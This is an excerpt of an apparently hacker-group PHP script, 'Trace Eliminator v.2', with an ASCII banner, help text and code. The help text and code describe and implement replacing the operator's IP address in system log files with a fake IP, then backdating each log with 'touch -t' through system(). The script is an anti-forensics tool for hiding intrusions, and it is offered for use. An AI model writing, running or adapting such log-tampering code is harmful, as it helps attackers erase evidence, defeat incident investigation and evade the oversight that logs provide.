    ...
    ================== I ========+
     ===================  =====+
      ===================  =?
        ================?
          =========??==
              ====I=      Trace Eliminator v.2\033[0m

\033[1;34m    # By: Hannibal Ksa (HK)\033[0m
\033[0;36m    @r00t3rz - r00t3rz.com\033[0m


";
if($argc < 2){ # no option
die("\033[1;32m[#] Usage : php ".$argv[0]." [OPTIONS]\033[0m\n\033[1;32m[!] Try : php ".$argv[0]." -h for more options.\033[0m\n\n"); # show how it'z works and exit
} elseif ($argv[1] == "-h" or $argv[1] == "--help" or $argv[1] == "help"){ # check if enter the help command not the ip
print "\033[1;32mUsage: php ".$argv[0]." [OPTIONS]\033[0m\n
\033[1;31mOptions:\033[0m
\033[1;37m   -c, --clean            Replace your IP-Adress in log file'z with a Fake-IP-Adress.
   ...
   Option \"-c\" Usage : php ".$argv[0]." -c <IP> <FAKE-IP> <FAKE-DATE>
               E.x   : php ".$argv[0]." -c 127.0.0.1 123.4.5.6 199001011212.43\033[0m

 \033[1;33m     The <FAKE-DATE> form is: [[CC]YY]MMDDhhmm[.ss]
      E.x : 199001011212.43
           > 1990 is the Century and Year/s ([[CC]YY])
           > 0101 is the Month and Day (MMDD)
           > 1212 is the Hour/s and the Minute/s (hhmm)
           > .43  is the Second/s (.ss)\033[0m\n\n";
sleep(1);
die(); # exit
...
print "\n\n\033[1;31m[!] Plz enter your IP.\033[0m\n\n";
sleep(1);
die(); # exit
} elseif ($fakeip == false){ # check if enterd the fake ip
print "\n\n\033[1;31m[!] Plz enter the Fake IP.\033[0m\n\n";
sleep(1);
die(); # exit
} elseif ($fakedate == false){ # check if enterd the fake date
print "\n\n\033[1;31m[!] Plz enter the Fake Date.\033[0m\n\n";
sleep(1);
die(); # exit
} else {
/*
...
echo "\n\n\033[1;32m[+] \"$log\" -> Cleaned !\033[0m\n"; # print the log that has been cleaned
sleep(1);
} else { # if isn't cleaned
echo "\n\033[1;31m[!] ERROR! while cleaning : \"$log\"\033[0m\n"; # print the log that couldn't be cleaned
sleep(1);
}
$fakeit = @system("touch -t $fakedate $log");
if($fakeit){
echo "\n\033[1;32m[+] \"$log\" -> Date changed !\033[0m\n"; # print the log that has been fakeed
sleep(1);
} else {
echo "\033[1;31m[-] ERROR while changing date : \"$log\"\033[0m\n"; # print the log that couldn't be faked
sleep(1);
}
}
print "\n\n\033[1;33m[!] Bye ...\033[0m\n\n";
